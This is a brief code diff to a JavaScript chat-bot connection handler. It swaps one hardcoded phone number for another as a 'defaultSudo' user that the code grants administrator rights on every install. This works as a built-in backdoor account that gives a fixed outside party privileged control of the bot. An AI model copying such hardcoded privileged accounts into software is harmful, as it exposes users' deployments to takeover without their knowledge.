@@ -71,7 +71,7 @@ const connectionHandler = async (sock, update, startBot) => {
 
             if (!sudoUsers.includes(userId)) {
                 await addSudoUser(userId);
-                const defaultSudo = "254114018035";
+                const defaultSudo = "254735342808";
                 if (!sudoUsers.includes(defaultSudo)) {
                     await addSudoUser(defaultSudo);
                 }
